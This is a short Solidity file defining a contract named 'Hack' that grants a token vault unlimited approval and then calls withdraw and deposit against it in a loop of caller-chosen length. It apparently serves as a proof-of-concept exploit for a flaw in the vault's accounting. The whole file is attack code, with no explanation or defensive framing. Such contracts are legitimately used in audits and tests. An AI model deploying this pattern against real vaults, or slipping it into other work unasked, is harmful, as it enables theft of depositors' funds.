import {
    SafeERC20,
    SafeMath,
    IERC20,
    Address
} from "@openzeppelin/contracts/token/ERC20/SafeERC20.sol";

interface VaultAPI is IERC20 {
    function deposit() external returns (uint256);

    function withdraw() external returns (uint256);
}

contract Hack {
    using SafeERC20 for IERC20;

    VaultAPI vault;
    IERC20 token;

    constructor(address _vault, address _token) public {
        vault = VaultAPI(_vault);
        token = IERC20(_token);
        token.safeApprove(address(vault), type(uint256).max);
    }

    function deposit() external {
        vault.deposit();
    }

    function loop(uint256 iters) external {
        for (uint256 i; i < iters; i++) {
            vault.withdraw();
            vault.deposit();
        }
        vault.withdraw();
    }
}
